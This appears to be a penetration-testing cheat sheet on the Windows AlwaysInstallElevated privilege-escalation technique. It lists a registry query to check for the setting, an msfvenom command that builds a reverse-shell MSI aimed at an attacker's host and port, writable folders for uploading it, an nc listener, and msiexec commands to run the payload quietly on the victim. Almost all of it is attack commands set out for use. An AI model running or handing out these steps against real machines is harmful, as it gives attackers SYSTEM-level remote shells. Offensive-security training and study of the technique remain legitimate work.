## Always Install Elevated

### Steps

#### Recon / Enumeration

Looking for the registry key that tells us if the machine has installed alwaysStayElevated:

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

if enabled, it will state as following in the response powershell:

```
HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

#### Exploitation

**Payload**

Create an Reverse Shell in MSI extension with following payload:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> lport=<port> -a x64 --platform windows -f msi -o exploit.msi
```

**Upload**

Upload an msi binary made with msfvenom to a folder you have permission to like:

```
C:\Temp
C:\Program Data\
C:\Users\<username>\Downloads,Desktop,etc
```

**Attacker Machine**

Listen to the port stated in the payload:

```
nc -lvnp <port>
```

**Victim Machine**

```
cd <uploaded_directory>
msiexec /queit /qn /i exploit.msi
```